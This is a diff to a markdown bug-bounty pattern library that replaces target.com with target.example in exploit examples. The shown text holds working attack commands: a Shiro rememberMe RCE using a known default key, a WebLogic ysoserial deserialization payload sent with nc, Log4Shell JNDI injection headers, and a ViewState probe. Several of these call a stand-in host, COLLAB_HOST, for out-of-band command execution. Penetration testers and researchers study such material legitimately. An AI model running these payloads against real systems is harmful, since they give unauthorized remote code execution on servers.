@@ -10,13 +10,13 @@ Pattern library built from 22 public bug bounty reports.
 
 **Detection:**
 ```bash
-curl -sI https://target.com/ | grep -i "rememberMe"
+curl -sI https://target.example/ | grep -i "rememberMe"
 # Set-Cookie: rememberMe=deleteMe → Shiro confirmed
 ```
 
 **Exploit:**
 ```bash
-python3 shiro_exploit.py -u https://target.com/ \
+python3 shiro_exploit.py -u https://target.example/ \
   -k "kPH+bIxk5D2deZiIxcaaaA==" \
   -c "curl http://COLLAB_HOST/shiro-rce"
 ```
@@ -34,15 +34,15 @@ python3 shiro_exploit.py -u https://target.com/ \
 
 **Detection:**
 ```bash
-nmap -sV -p 7001 target.com
+nmap -sV -p 7001 target.example
 # Service: weblogic
-curl -s http://target.com:7001/wls-wsat/CoordinatorPortType
+curl -s http://target.example:7001/wls-wsat/CoordinatorPortType
 ```
 
 **Exploit:**
 ```bash
 java -jar ysoserial-all.jar CommonsCollections1 \
-  'curl http://COLLAB_HOST/weblogic-rce' | nc target.com 7001
+  'curl http://COLLAB_HOST/weblogic-rce' | nc target.example 7001
 ```
 
 **Impact:** OS command execution as WebLogic service account.
@@ -95,8 +95,8 @@ payload = base64.b64encode(pickle.dumps(Exploit()))
 **Detection:**
 ```bash
 # Test all user-controlled inputs
-curl -H 'User-Agent: ${jndi:dns://COLLAB_HOST/ua}' https://target.com/
-curl -H 'X-Forwarded-For: ${jndi:dns://COLLAB_HOST/xff}' https://target.com/
+curl -H 'User-Agent: ${jndi:dns://COLLAB_HOST/ua}' https://target.example/
+curl -H 'X-Forwarded-For: ${jndi:dns://COLLAB_HOST/xff}' https://target.example/
 ```
 
 **Exploit chain:** JNDI lookup → attacker LDAP → loads malicious Java class → RCE
@@ -112,7 +112,7 @@ curl -H 'X-Forwarded-For: ${jndi:dns://COLLAB_HOST/xff}' https://target.com/
 **Detection:**
 ```bash
 # Look in page source for __VIEWSTATE without __VIEWSTATEMAC
-curl -s https://target.com/Default.aspx | grep -i "viewstate"
+curl -s https://target.example/Default.aspx | grep -i "viewstate"
 ```
 
 **Exploit via YSoSerial.Net:**
